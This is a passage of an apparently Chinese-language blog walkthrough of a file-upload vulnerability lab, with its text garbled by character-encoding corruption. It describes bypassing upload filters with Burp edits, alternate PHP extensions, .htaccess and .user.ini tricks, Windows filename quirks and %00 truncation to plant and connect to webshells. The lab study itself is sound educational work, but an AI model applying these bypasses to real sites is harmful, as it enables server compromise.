        <span class="token keyword">var</span> ext_name <span class="token operator">=</span> file<span class="token punctuation">.</span><span class="token function">substring</span><span class="token punctuation">(</span>file<span class="token punctuation">.</span><span class="token function">lastIndexOf</span><span class="token punctuation">(</span><span class="token string">"."</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token comment" spellcheck="true">//åˆ¤æ–­ä¸Šä¼ æ–‡ä»¶ç±»å‹æ˜¯å¦å…è®¸ä¸Šä¼ </span>
        <span class="token keyword">if</span> <span class="token punctuation">(</span>allow_ext<span class="token punctuation">.</span><span class="token function">indexOf</span><span class="token punctuation">(</span>ext_name<span class="token punctuation">)</span> <span class="token operator">==</span> <span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">)</span> <span class="token operator">&amp;</span><span class="token shell-comment comment">#123;</span>
            <span class="token keyword">var</span> errMsg <span class="token operator">=</span> <span class="token string">"è¯¥æ–‡ä»¶ä¸å…è®¸ä¸Šä¼ ï¼Œè¯·ä¸Šä¼ "</span> <span class="token operator">+</span> allow_ext <span class="token operator">+</span> <span class="token string">"ç±»å‹çš„æ–‡ä»¶,å½“å‰æ–‡ä»¶ç±»å‹ä¸ºï¼š"</span> <span class="token operator">+</span> ext_name<span class="token punctuation">;</span>
            <span class="token function">alert</span><span class="token punctuation">(</span>errMsg<span class="token punctuation">)</span><span class="token punctuation">;</span>
            <span class="token keyword">return</span> <span class="token boolean">false</span><span class="token punctuation">;</span>
        <span class="token operator">&amp;</span><span class="token shell-comment comment">#125;</span>
    <span class="token operator">&amp;</span><span class="token shell-comment comment">#125;</span></code></pre>
<p>å‡½æ•°çŸ¥è¯†è¡¥å……ï¼š</p>
<p>#document.getElementsByname(name[å¿…é¡»])</p>
<p>è¯¥æ–¹æ³•ä¸ getElementById() æ–¹æ³•ç›¸ä¼¼ï¼Œä½†æ˜¯å®ƒæŸ¥è¯¢å…ƒç´ çš„ name å±æ€§ï¼Œè€Œä¸æ˜¯ id å±æ€§ã€‚</p>
<p>getElementsByName() æ–¹æ³•è¿”å›çš„æ˜¯å…ƒç´ çš„æ•°ç»„ï¼Œè€Œä¸æ˜¯ä¸€ä¸ªå…ƒç´ ã€‚</p>
<p>#string.lastIndexOf(searchvalue[å¿…é¡»ï¼Œè¦æ£€ç´¢çš„å­—ç¬¦],start[å¯é€‰ï¼Œè¯´æ˜è¯´ç¬¬å‡ ä¸ªä½ç½®å¼€å§‹ï¼Œæ²¡å†™é»˜è®¤ä»0å¼€å§‹])</p>
<p>å¦‚æœæ²¡æœ‰åŒ¹é…åˆ°è¿”å› -1</p>
<p>è¯¥æ–¹æ³•ä¸string.indexOf()ç›¸ä¼¼ï¼Œä¸€ä¸ªæ˜¯æ‰¾å­—ç¬¦æœ€æ—©å‡ºç°çš„ä½ç½®ï¼Œä¸€ä¸ªæ˜¯æœ€åå‡ºç°çš„ä½ç½®ã€‚</p>
<p>#string.subsrting(from[å¿…é¡»ï¼Œè¡¨ç¤ºè¦å¼€å§‹æå‰å­—ç¬¦ä¸²çš„åˆå§‹ä½ç½®],to[å¯é€‰ï¼Œæ²¡å†™é»˜è®¤ä»fromå¼€å§‹åˆ°ç»“å°¾])</p>
<p>æ¥ä¸‹æ¥çœ‹çœ‹å¦‚ä½•ç»•è¿‡ï¼š</p>
<p>#åˆ é™¤onsubmitäº‹ä»¶ï¼Œç»•è¿‡éªŒè¯æœºåˆ¶ã€‚</p>
<p>#ä¿®æ”¹éªŒè¯å‡½æ•°ï¼ŒæŠŠreturn flaseï¼Œæ”¹æˆreturn trueã€‚</p>
<p>#æŠŠæ•´ä¸ªéªŒè¯å‡½æ•°åˆ é™¤ã€‚</p>
<p>#å…ˆä¼ ä¸ªåæœ€ä¸º.jpgçš„æ–‡ä»¶ã€‚ç»•è¿‡éªŒè¯ï¼Œå†ç”¨burpæ‹¦æˆªä¸‹æ¥ï¼Œä¿®æ”¹åç¼€ä¸º.phpã€‚</p>
<p>#ä¿®æ”¹ç™½åå•æ·»åŠ |.php|,ç»•è¿‡éªŒè¯ã€‚</p>
<p>æœ€åé€šè¿‡èœåˆ€æˆ–è€…èšå‰‘è¿æ¥ä¸Šwebshellã€‚</p>
<h3 id="0x02"><a href="#0x02" class="headerlink" title="#0x02"></a>#0x02</h3><p>è¯•ç€ä¸Šä¼ ä¸€ä¸ª.phpçš„æ–‡ä»¶ã€‚å‘ç°*<u>æç¤ºï¼šæ–‡ä»¶ç±»å‹ä¸æ­£ç¡®ï¼Œè¯·é‡æ–°ä¸Šä¼ ï¼</u>*</p>
<p>è¿™å…³åº”è¯¥æ˜¯æ‹¦æˆªæ–‡ä»¶ç±»å‹ï¼Œæ˜¯åœ¨æœåŠ¡å™¨ç«¯è¿›è¡Œæ‹¦æˆªã€‚</p>
<p>å‡½æ•°çŸ¥è¯†è¡¥å……ï¼š</p>
<p>#file_exists(path[å¿…é¡»])å‡½æ•°æ£€æŸ¥æ–‡ä»¶æˆ–ç›®å½•æ˜¯å¦å­˜åœ¨ã€‚å­˜åœ¨è¿”å›tureï¼Œåä¹‹è¿”å›flaseã€‚</p>
<p>#$_FILESæ˜¯ä¸€ä¸ªæ•°ç»„å˜é‡</p>
<pre class=" language-php"><code class="language-php"><span class="token variable">$_FILES</span><span class="token punctuation">[</span><span class="token string">'file'</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token string">'name'</span><span class="token punctuation">]</span> å®¢æˆ·ç«¯æ–‡ä»¶çš„åŸåç§°ã€‚ 
<span class="token variable">$_FILES</span><span class="token punctuation">[</span><span class="token string">'file'</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token string">'type'</span><span class="token punctuation">]</span> æ–‡ä»¶çš„ <span class="token constant">MIME</span> ç±»å‹ï¼Œéœ€è¦æµè§ˆå™¨æä¾›è¯¥ä¿¡æ¯çš„æ”¯æŒï¼Œä¾‹å¦‚<span class="token string">"image/gif"</span>ã€‚ 
<span class="token variable">$_FILES</span><span class="token punctuation">[</span><span class="token string">'file'</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token string">'size'</span><span class="token punctuation">]</span> å·²ä¸Šä¼ æ–‡ä»¶çš„å¤§å°ï¼Œå•ä½ä¸ºå­—èŠ‚ã€‚ 
<span class="token variable">$_FILES</span><span class="token punctuation">[</span><span class="token string">'file'</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token string">'tmp_name'</span><span class="token punctuation">]</span> æ–‡ä»¶è¢«ä¸Šä¼ ååœ¨æœåŠ¡ç«¯å‚¨å­˜çš„ä¸´æ—¶æ–‡ä»¶åï¼Œä¸€èˆ¬æ˜¯ç³»ç»Ÿé»˜è®¤ã€‚</code></pre>
<p>#move_uploaded_file(file[å¿…é¡»ï¼Œè¦ç§»åŠ¨çš„æ–‡ä»¶],newloc[å¿…é¡»ï¼Œè¦ç§»åŠ¨åˆ°çš„æ–°çš„ä½ç½®çš„ä¿¡æ¯])</p>
<p>æ¥ä¸‹æ¥çœ‹çœ‹å¦‚ä½•ç»•è¿‡ï¼š</p>
<p>#ä¸Šä¼ .phpçš„æœ¨é©¬æ–‡ä»¶ï¼Œç”¨burpæ‹¦æˆªä¸‹æ¥ï¼Œä¿®æ”¹content-type ä¸ºï¼šimage/jpegã€‚</p>
<h3 id="0x03"><a href="#0x03" class="headerlink" title="#0x03"></a>#0x03</h3><p>ä¸Šä¼ ä¸€ä¸ªæœ¨é©¬æ–‡ä»¶ï¼Œå‘ç°*<u>æç¤ºï¼šä¸å…è®¸ä¸Šä¼ .asp,.aspx,.php,.jspåç¼€æ–‡ä»¶ï¼</u>*</p>
<p>å‡½æ•°çŸ¥è¯†è¡¥å……ï¼š</p>
<p>#trim(string[å¿…é¡»ï¼Œè¦æ£€æµ‹çš„å­—ç¬¦ä¸²],charlist[å¯é€‰ï¼ŒæŒ‡å®šè¦åˆ é™¤å­—ç¬¦ä¸²ä¸­çš„å“ªäº›å­—ç¬¦])</p>
<p>å¦‚æœæ²¡å¡«charlisté»˜è®¤åˆ é™¤</p>
<ul>
<li>â€œ\0â€ - NULL</li>
<li>â€œ\tâ€ - åˆ¶è¡¨ç¬¦</li>
<li>â€œ\nâ€ - æ¢è¡Œ</li>
<li>â€œ\x0Bâ€ - å‚ç›´åˆ¶è¡¨ç¬¦</li>
<li>â€œ\râ€ - å›è½¦</li>
<li>â€œ â€œ - ç©ºæ ¼</li>
</ul>
<p>#deldot()åˆ é™¤æ–‡ä»¶åæœ«å°¾çš„ç‚¹</p>
<p>æ³¨ï¼šè¿™ä¸ªå‡½æ•°æ²¡æŸ¥åˆ°ï¼Œä¸å¤ªç¡®å®šã€‚</p>
<p>#strrchr(string[å¿…é¡»ï¼Œè¦æ£€æŸ¥çš„å­—ç¬¦ä¸²],char[å¿…é¡»ï¼Œè¦æŸ¥æ‰¾çš„å­—ç¬¦])</p>
<p>è¿”å›ä»è¯¥å­—ç¬¦å¼€å§‹ä¸€ç›´åˆ°æœ«å°¾çš„å­—ç¬¦ä¸²ã€‚</p>
<p>æ³¨ï¼šå¦‚æœcharå‚æ•°ç”¨æ•°å­—è¡¨ç¤ºï¼Œåˆ™è‡ªåŠ¨åŒ¹é…æ•°å­— ASCII å€¼çš„å­—ç¬¦ã€‚</p>
<p>#strtolower(string[å¿…é¡»,æŠŠå­—ç¬¦ä¸²è½¬åŒ–ä¸ºå°å†™])</p>
<p>#str_ireplace(find[å¿…é¡»ï¼Œè¦æŸ¥æ‰¾çš„å†…å®¹],replace[å¿…é¡»ï¼Œè¦æ›¿æ¢çš„å†…å®¹],string[å¿…é¡»ï¼Œè¦æ£€æŸ¥çš„å­—ç¬¦ä¸²])</p>
<p>#in_array(search[å¿…é¡»ï¼Œè¦åœ¨æ•°ç»„ä¸­æœç´¢çš„å€¼],array[å¿…é¡»ï¼Œè¦æœç´¢çš„æ•°ç»„],type[å¯é€‰])</p>
<p>å¦‚æœsearchå­˜åœ¨åœ¨arrayä¸­ï¼Œè¿”å›trueï¼Œåä¹‹è¿”å›flaseã€‚</p>
<p>ä¸‹é¢çœ‹çœ‹æ€ä¹ˆç»•è¿‡ï¼š</p>
<p>#è¿™é‡Œæ˜¯ç”¨é»‘åå•è¿›è¡Œè¿‡æ»¤ï¼Œä½†å´æ²¡æœ‰è¿‡æ»¤php3 php5 phml ç­‰</p>
<p>æ‰€ä»¥å¯ä»¥ä¸Šä¼ åç¼€ä¸ºphp3çš„æ–‡ä»¶è¿›è¡Œè§£æç»•è¿‡ã€‚</p>
<p>æ³¨ï¼šéœ€è¦å°†apacheé…ç½®æ–‡ä»¶ä¸­AddType X-application/http-php php3 php5 phtml å‰é¢çš„#å»æ‰ï¼Œå†é‡å¯ä¸‹æ‰èƒ½å¤ç°ã€‚</p>
<p>è€Œä¸”æœ€å¥½apacheæœåŠ¡å™¨ç‰ˆæœ¬ä½ç‚¹ï¼Œç‰ˆæœ¬å¤ªé«˜å¯èƒ½å¤ç°ä¸äº†ã€‚</p>
<h3 id="0x04ï¼ˆæˆ‘æ²¡å¤ç°æˆåŠŸï¼Œéœ€è¦æŠŠapacheçš„ç‰ˆæœ¬é™ä½æ‰è¡Œï¼‰"><a href="#0x04ï¼ˆæˆ‘æ²¡å¤ç°æˆåŠŸï¼Œéœ€è¦æŠŠapacheçš„ç‰ˆæœ¬é™ä½æ‰è¡Œï¼‰" class="headerlink" title="#0x04ï¼ˆæˆ‘æ²¡å¤ç°æˆåŠŸï¼Œéœ€è¦æŠŠapacheçš„ç‰ˆæœ¬é™ä½æ‰è¡Œï¼‰"></a>#0x04ï¼ˆæˆ‘æ²¡å¤ç°æˆåŠŸï¼Œéœ€è¦æŠŠapacheçš„ç‰ˆæœ¬é™ä½æ‰è¡Œï¼‰</h3><p>æŸ¥çœ‹æç¤ºï¼Œè¿‡æ»¤äº†å¥½å¤šåç¼€ã€‚ä½†æ˜¯æ²¡æœ‰è¿‡æ»¤ .htaccessæ–‡ä»¶ã€‚</p>
<p>å†™ä¸€ä¸ªå†…å®¹ä¸ºä»¥ä¸‹å†…å®¹çš„.htaccessæ–‡ä»¶ï¼Œå°±å¯æŠŠä¸Šä¼ çš„1.jpgå›¾ç‰‡æŒ‰phpæ–‡ä»¶è¿›è¡Œè§£æã€‚</p>
<pre class=" language-php"><code class="language-php"><span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>FirlesMatch</span> <span class="token attr-name">"1.jpg"</span><span class="token punctuation">></span></span></span>
SetHandler application<span class="token operator">/</span>x<span class="token operator">-</span>httpd<span class="token operator">-</span>php 
<span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>FilesMatch</span><span class="token punctuation">></span></span></span></code></pre>
<p>ä½¿ç”¨ä¹‹å‰è¦æŠŠapacheé…ç½®æ–‡ä»¶é‡ŒAllowOverrideè®¾ç½®ä¸ºAll</p>
<p>LoadModule rewrite_module modules/mod_rewrite.so å‰é¢çš„#åˆ é™¤ã€‚é‡å¯æœåŠ¡å™¨</p>
<p>çŸ¥è¯†è¡¥å……ï¼š</p>
<p>#.htaccessæ–‡ä»¶</p>
<p>.htaccessæ–‡ä»¶æ˜¯apacheçš„åˆ†å¸ƒå¼é…ç½®æ–‡ä»¶ã€‚ä»–è´Ÿè´£ç›¸å…³ç›®å½•ä¸‹çš„ç½‘é¡µé…ç½®ï¼Œé€šè¿‡.htaccesså¯ä»¥å¸®æˆ‘ä»¬å®ç°ã€‚å…¶å®å°±æ˜¯æŠŠ.htaccessé‡Œçš„å†…å®¹å†™åœ¨apacheçš„é…ç½®æ–‡ä»¶é‡Œã€‚</p>
<h3 id="0x05ï¼ˆç”¨php7-3ç‰ˆæœ¬ï¼‰"><a href="#0x05ï¼ˆç”¨php7-3ç‰ˆæœ¬ï¼‰" class="headerlink" title="#0x05ï¼ˆç”¨php7.3ç‰ˆæœ¬ï¼‰"></a>#0x05ï¼ˆç”¨php7.3ç‰ˆæœ¬ï¼‰</h3><p>è¿™å…³æç¤ºç›®å½•ä¸‹å­˜åœ¨readme.phpæ–‡ä»¶</p>
<p>è¿™å…³å’Œç¬¬4å…³ç±»ä¼¼ï¼Œä¸Šä¸€å…³æ˜¯åˆ©ç”¨apacheä¸­é—´ä»¶è¿›è¡Œç»•è¿‡ï¼Œè¿™å…³æ˜¯åˆ©ç”¨phpè§£æé—®é¢˜è¿›è¡Œç»•è¿‡ã€‚</p>
<p>çŸ¥è¯†è¡¥å……ï¼š</p>
<p>.user.ini åŠŸèƒ½å’Œ .htaccessåŠŸèƒ½ç±»ä¼¼ ä¸€ä¸ªæ˜¯apacheçš„ï¼Œä¸€ä¸ªçš„phpçš„é…ç½®æ–‡ä»¶ã€‚</p>
<p>ç»•è¿‡æˆåŠŸå‰æï¼š</p>
<p>#æœåŠ¡ç«¯è„šæœ¬è¯­è¨€æ˜¯PHPè¯­è¨€</p>
<p>#ä¸Šä¼ æ–‡ä»¶çš„ç›®å½•ä¸‹å­˜åœ¨å…¶ä»–çš„phpæ–‡ä»¶</p>
<p>#æœåŠ¡å™¨ä½¿ç”¨ CGIæˆ–è€…FASTCIGæ¨¡å¼</p>
<p>å»ºä¸€ä¸ª.user.ini çš„æ–‡ä»¶å†…å®¹ä¸ºï¼š</p>
<pre class=" language-php"><code class="language-php"> auto_prepend_file<span class="token operator">=</span>pass5<span class="token punctuation">.</span>png</code></pre>
<p>æ„æ€æ˜¯ï¼šè¯¥ç›®å½•ä¸‹çš„æ‰€æœ‰phpæ–‡ä»¶éƒ½åŒ…å«pass5.pngã€‚</p>
<p>å†åˆ›å»ºä¸€ä¸ªåä¸ºpass5.pngçš„æœ¨é©¬æ–‡ä»¶ä¸Šä¼ ã€‚ï¼ˆå¯ä»¥å…ˆç”¨å†…å®¹ä¸º &lt;?php phpinfo(); ?ã€‹è¯•ä¸‹ï¼‰</p>
<p>æ³¨ï¼šæŒ‰ç…§å¤§ä½¬çš„åšå®¢æ˜¯è¯´ï¼Œå®˜æ–¹è¯´ä¸Šä¼ å5åˆ†é’Ÿè¿‡åæ‰ä¼šç”Ÿæ•ˆï¼Œæ‰€ä»¥å¯ä»¥ç›´æ¥é‡å¯æœåŠ¡å™¨å‡å°‘æ—¶é—´ã€‚</p>
<p>è§£æpass5.pngè‚¯å®šä¸è¡Œï¼Œè§£æreadme.phpè§£ææˆåŠŸã€‚</p>
<p>ç”¨èœåˆ€å»è¿æ¥readme.phpå°±è¡Œã€‚</p>
<h3 id="0x06-php7-3-å¦‚æœå¤ç°ä¸äº†ï¼Œå¯ä»¥å»Buuçš„åœ¨çº¿é¶åœºå¤ç°ã€‚"><a href="#0x06-php7-3-å¦‚æœå¤ç°ä¸äº†ï¼Œå¯ä»¥å»Buuçš„åœ¨çº¿é¶åœºå¤ç°ã€‚" class="headerlink" title="#0x06(php7.3)å¦‚æœå¤ç°ä¸äº†ï¼Œå¯ä»¥å»Buuçš„åœ¨çº¿é¶åœºå¤ç°ã€‚"></a>#0x06(php7.3)å¦‚æœå¤ç°ä¸äº†ï¼Œå¯ä»¥å»Buuçš„åœ¨çº¿é¶åœºå¤ç°ã€‚</h3><p>è¿™å…³å°‘äº†ä¸ªå‡½æ•°</p>
<p>#strtolower()æŠŠå­—ç¬¦ä¸²è½¬ä¸ºå°å†™ï¼Œåœ¨winç³»ç»Ÿä¸‹å¯¹å¤§å°å†™ä¸æ•æ„Ÿï¼Œä¼šè‡ªåŠ¨å˜æˆå°å†™ã€‚Liunxç³»ç»Ÿä¸‹åˆ™å¯¹å¤§å°å†™æ•æ„Ÿã€‚</p>
<p>ä¸Šä¼ æœ¨é©¬æ–‡ä»¶fox.php,ç”¨burpæ‹¦æˆªè¯·æ±‚åŒ…ï¼Œä¿®æ”¹ä¸ºfox.PHP</p>
<h3 id="0x07-php5-2"><a href="#0x07-php5-2" class="headerlink" title="#0x07(php5.2)"></a>#0x07(php5.2)</h3><p>è¿™å…³å°‘äº†ä¸ªå‡½æ•°</p>
<p>#trim()å¦‚æœè¿˜ä¸æ‡‚è¯¥å‡½æ•°å•¥æ„æ€è‡ªè¡Œç™¾åº¦ï¼</p>
<p>æ³¨ï¼šåœ¨winç³»ç»Ÿä¸‹å‘¢ï¼Œå¦‚æœæ–‡ä»¶åç¼€æœ€åé¢æ˜¯ç©ºæ ¼ä¼šè‡ªåŠ¨çœå»ã€‚</p>
<p>ä¸Šä¼ æœ¨é©¬æ–‡ä»¶ä¸ºfox.php,ç”¨burpæ‹¦æˆªè¯·æ±‚åŒ…ï¼Œä¿®æ”¹ä¸ºfox.php_  [è¿™é‡Œ _æŒ‡çš„æ˜¯ç©ºæ ¼]</p>
<p>è¿™æ ·å¯ä»¥ç»•è¿‡æœåŠ¡ç«¯çš„éªŒè¯ï¼Œåˆ°è¾¾å®¢æˆ·ç«¯æ—¶è‡ªåŠ¨çœå»ç©ºæ ¼ã€‚</p>
<h3 id="0x08-php5-2"><a href="#0x08-php5-2" class="headerlink" title="#0x08(php5.2)"></a>#0x08(php5.2)</h3><p>è¿™å…³å°‘äº†ä¸ªå‡½æ•°</p>
<p>#deldot()ä¸æ‡‚ç™¾åº¦ï¼</p>
<p>åŸç†å’Œ0x07ä¸€æ ·ã€‚winç³»ç»Ÿä¼šçœå»æœ€åçš„ .</p>
<h3 id="0x09-php7-3-ä¸è¡Œå¯ä»¥å»buuåœ¨çº¿é¶åœºå¤ç°"><a href="#0x09-php7-3-ä¸è¡Œå¯ä»¥å»buuåœ¨çº¿é¶åœºå¤ç°" class="headerlink" title="#0x09(php7.3)ä¸è¡Œå¯ä»¥å»buuåœ¨çº¿é¶åœºå¤ç°"></a>#0x09(php7.3)ä¸è¡Œå¯ä»¥å»buuåœ¨çº¿é¶åœºå¤ç°</h3><p>è¿™é‡Œä¹Ÿæ˜¯åˆ©ç”¨winç³»ç»Ÿçš„ç‰¹æ€§ã€‚æ²¡æœ‰è¿‡æ»¤ï¼ˆï¼šï¼š$DATA)åœ¨åç¼€åŠ ï¼šï¼š$DATAå°±å¯ç»•è¿‡</p>
<p>07,08,09è¿™ä¸‰å…³éƒ½æ˜¯åˆ©ç”¨winç³»ç»Ÿç‹¬æœ‰çš„ç‰¹æ€§ã€‚æ‰€ä»¥æ¸—é€æ—¶ï¼Œæœé›†æ“ä½œç³»ç»Ÿä¿¡æ¯å¾ˆé‡è¦ï¼</p>
<h3 id="0x10"><a href="#0x10" class="headerlink" title="#0x10"></a>#0x10</h3><p>è¿™å…³æ˜¯ç»“åˆå‰é¢å‡ å…³ç»•è¿‡çš„ç‰¹ç‚¹è¿›è¡Œæ€»ç»“ä½¿ç”¨ã€‚</p>
<p>burp æ‹¦æˆªè¿›è¡Œåç¼€åæ‹¼å‡‘ç»•è¿‡ fox.php.. .ï¼ˆæˆ–è€…å…¶ä»–ç»„åˆæ–¹å¼winç³»ç»Ÿä¸‹æ‰å¯ä»¥ç”¨ï¼‰</p>
<p>ç»•è¿‡åŸç†ï¼Œå¯ä»¥æŠŠæ¯ä¸ªå‡½æ•°è¿‡æ»¤ç»“æœechoå‡ºæ¥è§‚å¯Ÿã€‚</p>
<h3 id="0x11"><a href="#0x11" class="headerlink" title="#0x11"></a>#0x11</h3><p>è¿™å…³æ˜¯æŠŠé»‘åå•é‡Œçš„å­—ç¬¦ä¸²ï¼Œæ›¿æ¢æˆç©ºã€‚</p>
<p>è¿™é‡Œå¯ä»¥åˆ©ç”¨SQLæ³¨å…¥é‡Œçš„å åŠ ã€‚</p>
<p>#fox.pphphp(è¿™æ ·è§£æåå°±å˜æˆfox.php)å°±ä¸Šä¼ æˆåŠŸ</p>
<p>æ³¨ï¼šä¸èƒ½å†™æˆfox.phphpp,ä¸ç„¶ä¼šè¢«è§£ææˆfox.hpp</p>
<h3 id="0x12"><a href="#0x12" class="headerlink" title="#0x12"></a>#0x12</h3><pre class=" language-php"><code class="language-php"><span class="token variable">$img_path</span> <span class="token operator">=</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string">'save_path'</span><span class="token punctuation">]</span><span class="token punctuation">.</span><span class="token string">"/"</span><span class="token punctuation">.</span><span class="token function">rand</span><span class="token punctuation">(</span><span class="token number">10</span><span class="token punctuation">,</span> <span class="token number">99</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">date</span><span class="token punctuation">(</span><span class="token string">"YmdHis"</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token string">"."</span><span class="token punctuation">.</span><span class="token variable">$file_ext</span><span class="token punctuation">;</span></code></pre>
<p>è¿™å…³è¿˜æœ‰ä¸ªå¯æ§çš„åœ°æ–¹å°±æ˜¯ save_path (å°±æ˜¯è·¯å¾„å¯æ§)</p>
<p>å¯ä»¥ä½¿ç”¨%00æˆªæ–­ã€‚è¿™ä¸ª%00æˆªæ–­å…¶å®å’ŒSQLæ³¨å…¥é‡Œçš„æ³¨é‡Šä½œç”¨æ˜¯ä¸€æ ·çš„è®©åé¢éƒ¨åˆ†æ²¡æœ‰ä½œç”¨ã€‚</p>
<p>é‚£æˆ‘ä»¬å¯ä»¥ä¸Šä¼ ä¸€ä¸ªä»£æœ‰ä¸€å¥è¯æœ¨é©¬çš„å›¾ç‰‡ï¼Œç»•è¿‡å‰é¢çš„æ£€æµ‹ã€‚</p>
<p>åœ¨save_pathåŠ¨æ‰‹è„š</p>
<p><img src="/images/13.png"></p>
<p><img src="/images/14.png"></p>
<p>è¿™æ ·å°±ä¼šè®©åŸæœ¬å›¾ç‰‡é‡Œé¢çš„phpä»£ç ï¼Œç”Ÿæˆåœ¨fox.phpè¿™ä¸ªæ–‡ä»¶é‡Œå¹¶å†™åœ¨è¯¥ç›®å½•ä¸‹ã€‚å°±å¯ä»¥æˆåŠŸç»•è¿‡ä¸Šä¼ äº†ã€‚</p>
<p>æ³¨ï¼šéœ€è¦æŠŠphp.ini é…ç½®æ–‡ä»¶é‡Œçš„ magic_quotes_gpc è®¾ç½®ä¸ºOff</p>
<p>ä¸ç„¶ä¼šè‡ªåŠ¨è¿‡æ»¤ï¼Œä¼šå¤±è´¥ã€‚</p>
<h3 id="0x13"><a href="#0x13" class="headerlink" title="#0x13"></a>#0x13</h3><p>å’Œ12å…³æ²¡å•¥åŒºåˆ«ï¼Œæ²¡ä»€ä¹ˆå¥½è®²çš„ã€‚</p>
<h3 id="0x14"><a href="#0x14" class="headerlink" title="#0x14"></a>#0x14</h3><p>å…ˆè®²ä¸‹ç›¸å¯¹è·¯å¾„</p>
<p>#./è¡¨ç¤ºå½“å‰ç›®å½•ä¸‹</p>
<p>#../è¡¨ç¤ºä¸Šä¸€çº§ç›®å½•ï¼Œå°±æ˜¯å…ˆç§»åŠ¨åˆ°ä¸Šä¸€å±‚ç›®å½•ï¼Œå†å¯»æ‰¾ç›¸å…³æ–‡ä»¶ã€‚</p>
<p>å‡½æ•°çŸ¥è¯†è¡¥å……ï¼š</p>
<p>#rb æ˜¯åªè¯»çš„æ„æ€ï¼Œrb+æ˜¯è¯»å†™</p>
<p>#fread(resource $handle , int $length)</p>
<table>
<thead>
<tr>
<th><strong>handle</strong></th>
<th><strong>æ–‡ä»¶ç³»ç»ŸæŒ‡é’ˆï¼Œæ˜¯å…¸å‹åœ°ç”± fopen() åˆ›å»ºçš„ resource(èµ„æº)ã€‚</strong></th>
</tr>
</thead>
<tbody><tr>
<td><strong>length</strong></td>
<td><strong>å¿…éœ€ã€‚è§„å®šè¦è¯»å–çš„æœ€å¤§å­—èŠ‚æ•°ã€‚</strong></td>
</tr>
</tbody></table>
<p>å‡½æ•°ä¼šåœ¨åˆ°è¾¾æŒ‡å®šé•¿åº¦æˆ–è¯»åˆ°æ–‡ä»¶æœ«å°¾ï¼ˆEOFï¼‰æ—¶ï¼ˆä»¥å…ˆåˆ°è€…ä¸ºå‡†ï¼‰ï¼Œåœæ­¢è¿è¡Œã€‚</p>
<p>è¯¥å‡½æ•°è¿”å›è¯»å–çš„å­—ç¬¦ä¸²ï¼Œå¦‚æœå¤±è´¥åˆ™è¿”å› FALSEã€‚</p>
<p>#unpack(format,data)</p>
<table>
<thead>
<tr>
<th>å‚æ•°</th>
<th>æè¿°</th>
</tr>
</thead>
<tbody><tr>
<td><em>format</em></td>
<td>å¿…éœ€ã€‚è§„å®šåœ¨è§£åŒ…æ•°æ®æ—¶æ‰€ä½¿ç”¨çš„æ ¼å¼ã€‚</td>
</tr>
<tr>
<td>data</td>
<td>å¿…éœ€ã€‚è§„å®šè¢«è§£åŒ…çš„äºŒè¿›åˆ¶æ•°æ®ã€‚</td>
</tr>
</tbody></table>
<p>è¿”å›çš„æ˜¯ä¸€ä¸ªæ•°ç»„</p>
<pre class=" language-php"><code class="language-php"><span class="token delimiter">&lt;?php</span>
<span class="token variable">$data</span> <span class="token operator">=</span> <span class="token string">"GIF89a"</span><span class="token punctuation">;</span>
<span class="token function">print_r</span><span class="token punctuation">(</span><span class="token function">unpack</span><span class="token punctuation">(</span><span class="token string">"C2chars"</span><span class="token punctuation">,</span><span class="token variable">$data</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token delimiter">?></span> 
<span class="token delimiter">&lt;?php</span>
<span class="token variable">$data</span> <span class="token operator">=</span> <span class="token string">"PHP"</span><span class="token punctuation">;</span>
<span class="token function">print_r</span><span class="token punctuation">(</span><span class="token function">unpack</span><span class="token punctuation">(</span><span class="token string">"Cmyint"</span><span class="token punctuation">,</span><span class="token variable">$data</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token delimiter">?></span>
<span class="token delimiter">&lt;?php</span>
<span class="token variable">$data</span> <span class="token operator">=</span> <span class="token string">"PHP"</span><span class="token punctuation">;</span>
<span class="token function">print_r</span><span class="token punctuation">(</span><span class="token function">unpack</span><span class="token punctuation">(</span><span class="token string">"C*"</span><span class="token punctuation">,</span><span class="token variable">$data</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token delimiter">?></span> 
<span class="token delimiter">&lt;?php</span>
<span class="token variable">$bin</span> <span class="token operator">=</span> <span class="token function">pack</span><span class="token punctuation">(</span><span class="token string">"c2n2"</span><span class="token punctuation">,</span><span class="token number">0x1234</span><span class="token punctuation">,</span><span class="token number">0x5678</span><span class="token punctuation">,</span><span class="token number">65</span><span class="token punctuation">,</span><span class="token number">66</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token function">print_r</span><span class="token punctuation">(</span><span class="token function">unpack</span><span class="token punctuation">(</span><span class="token string">"c4chars/n2int"</span><span class="token punctuation">,</span><span class="token variable">$bin</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token delimiter">?></span></code></pre>
<pre class=" language-php"><code class="language-php"><span class="token keyword">Array</span>
<span class="token punctuation">(</span>
    <span class="token punctuation">[</span>chars1<span class="token punctuation">]</span> <span class="token operator">=</span><span class="token operator">></span> <span class="token number">71</span>
    <span class="token punctuation">[</span>chars2<span class="token punctuation">]</span> <span class="token operator">=</span><span class="token operator">></span> <span class="token number">73</span>
<span class="token punctuation">)</span>

<span class="token keyword">Array</span>
<span class="token punctuation">(</span>
    <span class="token punctuation">[</span>myint<span class="token punctuation">]</span> <span class="token operator">=</span><span class="token operator">></span> <span class="token number">80</span>
<span class="token punctuation">)</span>
<span class="token keyword">Array</span>
<span class="token punctuation">(</span>
    <span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span> <span class="token operator">=</span><span class="token operator">></span> <span class="token number">80</span>
    <span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">]</span> <span class="token operator">=</span><span class="token operator">></span> <span class="token number">72</span>
